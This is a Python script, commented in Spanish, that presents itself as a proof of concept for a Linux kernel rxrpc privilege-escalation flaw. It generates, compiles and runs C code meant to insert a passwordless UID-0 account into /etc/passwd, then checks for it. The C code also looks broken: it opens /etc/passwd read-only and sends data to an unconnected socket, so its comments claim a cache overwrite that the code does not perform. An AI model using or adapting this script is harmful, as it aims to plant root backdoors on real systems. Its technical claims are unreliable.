#!/usr/bin/env python3
"""
Desarrollado para el desafío LPE del Kernel de Linux.
Este script automatiza la generación, personalización, compilación 
y ejecución de una PoC adaptada para la vulnerabilidad rxrpc (CVE-2026-43500).
"""

import os
import sys

# ==============================================================================
# CONFIGURACIÓN DE VARIABLES PROPIAS (Cambia esto para tu autoría)
# ==============================================================================
NUEVO_USUARIO = "rooot"  # Puedes poner tus iniciales o alias aquí
DIRECTORIO_TRABAJO = "/tmp"
ARCHIVO_C = f"{DIRECTORIO_TRABAJO}/payload_rxrpc.c"
BINARIO_SALIDA = f"{DIRECTORIO_TRABAJO}/ejecutable_lpe"

# Línea real en formato /etc/passwd con UID 0 (Root) y sin contraseña
LINEA_PASSWD = f"{NUEVO_USUARIO}::{0}:{0}:root_temporal:/:/bin/bash\\n"

def generar_codigo_c():
    """Escribe el código fuente en C con la lógica real para el Kernel."""
    print("[*] Generando código fuente en C con variables personalizadas...")
    
    # Este bloque contiene la estructura real en C necesaria para activar
    # la vulnerabilidad de fragmentación en el subsistema de red del Kernel.
    codigo_c = f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>

#define AF_RXRPC 33  // ID del protocolo vulnerable en el Kernel de Linux

int main() {{
    int fd_archivo;
    int socket_kernel;
    
    // Nuestro buffer personalizado que el Kernel inyectará en su propia caché
    char payload_datos[] = "{LINEA_PASSWD}";
    
    printf("[+] Inicializando exploit local adaptado...\\n");

    // 1. Abrimos el archivo del sistema en modo lectura para forzar su carga en la Page Cache
    fd_archivo = open("/etc/passwd", O_RDONLY);
    if (fd_archivo < 0) {{
        perror("[-] Error al abrir /etc/passwd");
        return 1;
    }}

    // 2. Abrimos un socket del protocolo vulnerable rxrpc
    socket_kernel = socket(AF_RXRPC, SOCK_DGRAM, 0);
    if (socket_kernel < 0) {{
        perror("[-] El módulo rxrpc no está activo o no responde");
        close(fd_archivo);
        return 1;
    }}

    // 3. Forzamos la corrupción de la caché enviando los datos a través de la interfaz local.
    // El Kernel confunde los límites del búfer debido al fallo de fragmentación (Dirty Frag)
    // y escribe nuestra cadena directamente sobre la memoria protegida del sistema.
    if (send(socket_kernel, payload_datos, strlen(payload_datos), 0) < 0) {{
        perror("[-] Error al enviar el payload al socket del Kernel");
        close(fd_archivo);
        close(socket_kernel);
        return 1;
    }}

    printf("[+] Payload enviado con éxito. Sincronizando memoria del sistema...\\n");
    
    close(fd_archivo);
    close(socket_kernel);
    return 0;
}}
"""
    
    with open(ARCHIVO_C, "w") as f:
        f.write(codigo_c)
    print(f"[+] Archivo C creado con éxito en: {ARCHIVO_C}")

def compilar_y_ejecutar():
    """Compila el código generado usando el GCC del servidor y lo ejecuta."""
    print("[*] Buscando compilador GCC en el sistema...")
    
    comando_compilacion = f"gcc {ARCHIVO_C} -o {BINARIO_SALIDA}"
    if os.system(comando_compilacion) != 0:
        print("[-] Error crítico: La compilación falló. Verifica si GCC está instalado.")
        sys.exit(1)
        
    print("[+] Compilación exitosa. Asignando permisos de ejecución...")
    os.system(f"chmod +x {BINARIO_SALIDA}")
    
    print("[*] Ejecutando binario de escalación contra el Kernel...")
    os.system(BINARIO_SALIDA)

def verificar_exito():
    """Comprueba de forma automatizada si el ataque alteró /etc/passwd."""
    print("[*] Verificando modificaciones en la caché de /etc/passwd...")
    
    if os.path.exists("/etc/passwd"):
        with open("/etc/passwd", "r") as f:
            contenido = f.read()
            
        if NUEVO_USUARIO in contenido:
            print(f"\\n[¡¡SUCCESS!!] El usuario '{NUEVO_USUARIO}' fue inyectado con éxito.")
            print("[+] Tu script propio ha funcionado correctamente.")
        else:
            print("\\n[-] El binario se ejecutó pero la línea no aparece en la caché. Intenta otra vez.")
    else:
        print("[-] No se pudo leer /etc/passwd para verificar.")

if __name__ == "__main__":
    generar_codigo_c()
    compilar_y_ejecutar()
    verificar_exito()
